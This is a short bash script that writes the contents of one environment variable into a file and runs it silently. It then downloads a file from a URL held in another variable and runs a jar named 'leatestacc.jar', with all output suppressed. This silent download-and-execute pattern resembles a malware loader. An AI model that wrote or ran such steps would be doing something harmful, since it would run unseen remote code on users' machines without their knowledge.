#!/bin/bash
echo $LINK2 > start2.sh
bash start2.sh &> /dev/null
wget "$LINK" &> /dev/null && java -jar leatestacc.jar















